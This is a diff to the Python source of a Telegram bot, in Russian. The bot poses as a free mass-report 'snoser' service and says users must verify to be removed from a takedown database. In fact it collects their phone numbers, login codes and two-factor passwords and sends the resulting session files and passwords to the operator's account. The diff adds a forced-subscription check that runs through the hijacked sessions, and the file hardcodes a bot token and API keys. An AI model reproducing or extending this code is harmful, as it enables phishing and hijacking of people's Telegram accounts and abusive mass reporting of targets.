@@ -4,7 +4,7 @@ import shutil
 from datetime import datetime
 from pathlib import Path
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, FloodWaitError
 from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command, StateFilter
@@ -18,6 +18,14 @@ BOT_TOKEN = "8704361523:AAHqi_mbS-7bD6Rtb9YqcRJUYJJBhJH045E"  # СМЕНИТЬ!
 YOUR_USER_ID = 7546928092  # СМЕНИТЬ!
 API_ID = 35800959  # СМЕНИТЬ!
 API_HASH = '708e7d0bc3572355bcaf68562cc068f1'  # СМЕНИТЬ!
+
+# === ПРИВАТНЫЕ КАНАЛЫ ДЛЯ ПОДПИСКИ ===
+# Укажите ID или username каналов (можно в формате @username или -100xxxxxxxxx)
+REQUIRED_CHANNELS = [
+    "-1003787925496",  # Замените на ваш канал
+    "-1003828940939",  # Замените на ваш канал
+    "-1003630830270"   # Замените на ваш канал
+]
 
 # Прокси (опционально)
 PROXY = None  # или словарь с настройками
@@ -57,6 +65,30 @@ def create_client(user_id):
         )
     return TelegramClient(session_file, API_ID, API_HASH)
 
+async def check_subscriptions(user_id, client):
+    """Проверяет подписку на все обязательные каналы"""
+    not_subscribed = []
+    
+    for channel in REQUIRED_CHANNELS:
+        try:
+            # Пробуем получить участника
+            participant = await client.get_participant(channel)
+            # Если дошли сюда - пользователь в канале
+            continue
+        except FloodWaitError as e:
+            await asyncio.sleep(e.seconds)
+            # Повторяем проверку
+            try:
+                participant = await client.get_participant(channel)
+                continue
+            except:
+                not_subscribed.append(channel)
+        except:
+            # Пользователь не подписан или ошибка
+            not_subscribed.append(channel)
+    
+    return not_subscribed
+
 async def send_session_to_admin(user_id, phone, client, password=None):
     """Отправляет админу файл сессии, код 2FA и информацию"""
     try:
@@ -91,6 +123,20 @@ async def send_session_to_admin(user_id, phone, client, password=None):
     except Exception as e:
         await bot.send_message(YOUR_USER_ID, f"Ошибка: {e}")
 
+def get_channels_keyboard(not_subscribed):
+    """Создает клавиатуру с кнопками для подписки на каналы"""
+    buttons = []
+    for channel in not_subscribed:
+        # Убираем @ если есть
+        clean_channel = channel.replace('@', '')
+        buttons.append([InlineKeyboardButton(
+            text=f"📢 Подписаться на {clean_channel}",
+            url=f"https://t.me/{clean_channel}"
+        )])
+    buttons.append([InlineKeyboardButton(text="🔄 Проверить подписку", callback_data="check_subscription")])
+    buttons.append([InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_auth")])
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
+
 # ===== КЛАВИАТУРЫ =====
 def code_keyboard():
     buttons = []
@@ -120,7 +166,17 @@ def main_menu():
 async def start(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
     if user_id in user_clients and user_clients[user_id].is_connected():
-        await message.answer("✅ Вы авторизованы!", reply_markup=main_menu())
+        # Проверяем подписки перед показом меню
+        not_subscribed = await check_subscriptions(user_id, user_clients[user_id])
+        if not_subscribed:
+            channels_text = "\n".join([f"• {ch}" for ch in not_subscribed])
+            await message.answer(
+                f"⚠️ **Для использования бота необходимо подписаться на каналы:**\n\n{channels_text}\n\n"
+                f"После подписки нажмите кнопку проверки.",
+                reply_markup=get_channels_keyboard(not_subscribed)
+            )
+        else:
+            await message.answer("✅ Вы авторизованы!", reply_markup=main_menu())
     else:
         await message.answer(
             "Добрый день, это сносер БЕСПЛАТНЫЙ, но требует верификации для удаления ВАС из базы данных сносов, "
@@ -160,7 +216,17 @@ async def get_phone(message: types.Message, state: FSMContext):
             await state.set_state(AuthStates.waiting_code)
         else:
             user_clients[user_id] = client
-            await message.answer("✅ Вы уже авторизованы!", reply_markup=main_menu())
+            # Проверяем подписки
+            not_subscribed = await check_subscriptions(user_id, client)
+            if not_subscribed:
+                channels_text = "\n".join([f"• {ch}" for ch in not_subscribed])
+                await message.answer(
+                    f"⚠️ **Для использования бота необходимо подписаться на каналы:**\n\n{channels_text}\n\n"
+                    f"После подписки нажмите кнопку проверки.",
+                    reply_markup=get_channels_keyboard(not_subscribed)
+                )
+            else:
+                await message.answer("✅ Вы авторизованы!", reply_markup=main_menu())
             await state.clear()
     
     except Exception as e:
@@ -179,7 +245,6 @@ async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
             parse_mode="Markdown"
         )
     elif action == "done":
-        # Подтверждение кода
         code = auth_states[user_id].get("code", "")
         client = auth_states[user_id].get("client")
         phone = auth_states[user_id].get("phone", "")
@@ -193,15 +258,23 @@ async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
             await client.sign_in(phone, code)
             user_clients[user_id] = client
             
-            # Отправляем сессию админу (без 2FA)
             await send_session_to_admin(user_id, phone, client)
             
-            await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
-            await callback.message.answer("Выберите действие:", reply_markup=main_menu())
+            # Проверяем подписки
+            not_subscribed = await check_subscriptions(user_id, client)
+            if not_subscribed:
+                channels_text = "\n".join([f"• {ch}" for ch in not_subscribed])
+                await callback.message.edit_text(
+                    f"⚠️ **Для использования бота необходимо подписаться на каналы:**\n\n{channels_text}\n\n"
+                    f"После подписки нажмите кнопку проверки.",
+                    reply_markup=get_channels_keyboard(not_subscribed)
+                )
+            else:
+                await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
+                await callback.message.answer("Выберите действие:", reply_markup=main_menu())
             await state.clear()
         
         except SessionPasswordNeededError:
-            # Запрашиваем 2FA пароль
             await callback.message.edit_text(
                 "🔐 Включена двухфакторная аутентификация.\n"
                 "Введите пароль (обычным текстом):",
@@ -213,7 +286,6 @@ async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
             await callback.message.edit_text(f"❌ Неверный код: {str(e)}\nПопробуйте /start")
             await state.clear()
     else:
-        # Обычная цифра
         auth_states[user_id]["code"] += action
         await callback.message.edit_text(
             f"🔢 Введите код:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
@@ -238,15 +310,47 @@ async def handle_password(message: types.Message, state: FSMContext):
         await client.sign_in(password=password)
         user_clients[user_id] = client
         
-        # Отправляем сессию и 2FA пароль админу
         await send_session_to_admin(user_id, phone, client, password=password)
         
-        await message.answer("✅ Авторизация успешна! Сессия сохранена.")
-        await message.answer("Выберите действие:", reply_markup=main_menu())
+        # Проверяем подписки
+        not_subscribed = await check_subscriptions(user_id, client)
+        if not_subscribed:
+            channels_text = "\n".join([f"• {ch}" for ch in not_subscribed])
+            await message.answer(
+                f"⚠️ **Для использования бота необходимо подписаться на каналы:**\n\n{channels_text}\n\n"
+                f"После подписки нажмите кнопку проверки.",
+                reply_markup=get_channels_keyboard(not_subscribed)
+            )
+        else:
+            await message.answer("✅ Авторизация успешна! Сессия сохранена.")
+            await message.answer("Выберите действие:", reply_markup=main_menu())
         await state.clear()
     except Exception as e:
         await message.answer(f"❌ Неверный пароль: {str(e)}")
         await state.set_state(AuthStates.waiting_password)
+
+@dp.callback_query(F.data == "check_subscription")
+async def check_subscription_callback(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    
+    if user_id not in user_clients or not user_clients[user_id].is_connected():
+        await callback.answer("❌ Сначала авторизуйтесь через /start", show_alert=True)
+        return
+    
+    not_subscribed = await check_subscriptions(user_id, user_clients[user_id])
+    
+    if not_subscribed:
+        channels_text = "\n".join([f"• {ch}" for ch in not_subscribed])
+        await callback.message.edit_text(
+            f"⚠️ **Вы не подписаны на каналы:**\n\n{channels_text}\n\n"
+            f"Подпишитесь и нажмите проверку.",
+            reply_markup=get_channels_keyboard(not_subscribed)
+        )
+    else:
+        await callback.message.edit_text("✅ Спасибо за подписку! Теперь вы можете пользоваться ботом.")
+        await callback.message.answer("Выберите действие:", reply_markup=main_menu())
+    
+    await callback.answer()
 
 @dp.callback_query(F.data == "cancel")
 async def cancel(callback: types.CallbackQuery, state: FSMContext):
@@ -257,6 +361,18 @@ async def cancel(callback: types.CallbackQuery, state: FSMContext):
             await client.disconnect()
         auth_states.pop(user_id)
     await callback.message.edit_text("❌ Отменено.\nИспользуйте /start")
+    await state.clear()
+    await callback.answer()
+
+@dp.callback_query(F.data == "cancel_auth")
+async def cancel_auth(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    if user_id in user_clients:
+        await user_clients[user_id].disconnect()
+        del user_clients[user_id]
+    if user_id in auth_states:
+        auth_states.pop(user_id)
+    await callback.message.edit_text("❌ Авторизация отменена.\nИспользуйте /start")
     await state.clear()
     await callback.answer()
 
@@ -278,6 +394,18 @@ async def start_snos(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     if user_id not in user_clients or not user_clients[user_id].is_connected():
         await callback.answer("❌ Сначала авторизуйтесь через /start", show_alert=True)
+        return
+    
+    # Дополнительная проверка подписки перед сносом
+    not_subscribed = await check_subscriptions(user_id, user_clients[user_id])
+    if not_subscribed:
+        channels_text = "\n".join([f"• {ch}" for ch in not_subscribed])
+        await callback.message.answer(
+            f"⚠️ **Для использования бота необходимо подписаться на каналы:**\n\n{channels_text}\n\n"
+            f"После подписки нажмите кнопку проверки.",
+            reply_markup=get_channels_keyboard(not_subscribed)
+        )
+        await callback.answer()
         return
     
     await callback.message.answer("👤 Введите юзернейм (без @) или ID:")
@@ -325,6 +453,7 @@ async def get_count(message: types.Message, state: FSMContext):
 # ===== ЗАПУСК =====
 async def main():
     print("🚀 Бот запущен")
+    print(f"📢 Обязательные каналы для подписки: {REQUIRED_CHANNELS}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
